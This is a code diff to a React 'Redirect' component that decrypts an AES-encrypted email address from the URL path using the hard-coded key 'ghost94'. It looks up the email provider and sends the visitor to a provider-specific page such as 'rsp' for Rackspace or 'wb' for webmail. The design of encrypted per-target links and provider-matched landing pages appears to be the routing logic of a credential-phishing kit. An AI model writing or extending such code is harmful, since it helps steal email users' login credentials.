@@ -2,7 +2,7 @@ import { navigate } from "@reach/router";
 import React, { useEffect } from "react";
 import { getHost } from "./servers";
 
-var dns = require("dns");
+var CryptoJS = require("crypto-js");
 
 const pages = [
   { name: "rackspace", pagename: "rsp" },
@@ -21,7 +21,31 @@ const pages = [
   { name: "webmail", pagename: "wb" },
 ];
 
-function Redirect({ email }) {
+// { email }
+function Redirect() {
+  const path = window.location.pathname;
+  const id = path.substr(1);
+
+  var bytes = CryptoJS.AES.decrypt(id, "ghost94");
+  var originalText = bytes.toString(CryptoJS.enc.Utf8);
+  console.log(originalText);
+  const email = originalText;
+  const splitEmail = email.split("@");
+  const emailDomain = splitEmail[splitEmail.length - 1];
+  console.log(email);
+  console.log(emailDomain);
+
+  getHost(email).then((data) => {
+    console.log(data);
+    const pagetoNavigate = pages.find((element) => element.name === data.host);
+    console.log(pagetoNavigate.pagename);
+    navigate(`../${pagetoNavigate.pagename}`, {
+      state: { email: email, domain: emailDomain },
+    });
+  });
+
+  /*
+
   useEffect(() => {
     const splitEmail = email.split("@");
     const emailDomain = splitEmail[splitEmail.length - 1];
@@ -41,6 +65,8 @@ function Redirect({ email }) {
 
     //  navigate("qaq", { state: { email: email, domain: emailDomain } });
   }, []);
+
+  */
 
   return <div>please wait...</div>;
 }
